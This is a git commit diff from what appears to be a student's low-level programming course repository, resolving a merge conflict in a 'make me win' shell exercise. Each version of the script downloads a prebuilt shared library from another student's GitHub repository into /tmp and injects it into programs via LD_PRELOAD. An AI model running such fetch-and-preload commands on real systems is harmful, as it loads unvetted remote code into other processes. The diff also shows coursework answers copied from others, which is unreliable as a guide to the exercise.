227bf708475f7c83ee86a5798c6fdc2d9f994043
root <you@example.com>
2022-10-03 13:19:42 -0700

    Task 4

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,9 +1,3 @@
 #!/bin/bash
-<<<<<<< HEAD
-wget https://github.com/svelezg/holbertonschool-low_level_programming/raw/master/0x18-dynamic_libraries/inject.so -P ../
-
-export LD_PRELOAD=../inject.so
-=======
-wget -P /tmp https://github.com/sammykingx/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
-export LD_PRELOAD=/tmp/hacked.so
->>>>>>> b369ab2848291afc543968881119d4198d1fe5ee
+wget -P /tmp https://github.com/Tolulope05/alx-low_level_programming/raw/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
